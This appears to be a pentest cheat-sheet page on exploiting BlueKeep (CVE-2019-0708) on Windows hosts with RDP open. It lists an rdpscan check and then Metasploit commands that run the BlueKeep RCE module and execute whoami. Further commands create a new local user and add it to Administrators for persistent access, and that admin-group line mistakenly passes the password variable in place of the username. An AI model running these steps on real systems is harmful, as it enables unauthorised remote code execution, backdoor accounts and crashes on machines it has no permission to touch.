# BlueKeep [CVE-2019-0708]
---

> [!CAUTION]
> BlueKeep exploit is not stable and might cause a **crash** of the target.

#### 🤓 RTFM

TODO

#### 📝 Prerequisites

- Target is a Windows host with RDP port opened (3389 by default).

#### 🛠️ Do it!

First of all, you can check if target is vulnerable using [RDPScan](https://github.com/robertdavidgraham/rdpscan).

```bash
rdpscan $target
```

To exploit vulnerable targets, run following commands using [Metasploit](https://github.com/rapid7/metasploit-framework).

```bash
# Start metasploit.
msfconsole

# Look for bluekeep exploit.
search bluekeep

# Take (exploit/windows/rdp/cve_2019_0708_bluekeep_rce).
use 1

# Take payload (windows/x64/exec).
show payloads
set payload 19

# Setup the exploit to check exploitability (should return local\SYSTEM).
set CMD whoami
set RHOSTS $target
run

# To gain administrative access.
set CMD net user $username $password /add; net localgroup Administrators $password /add
run
```

#### 🏆 What's next?

TODO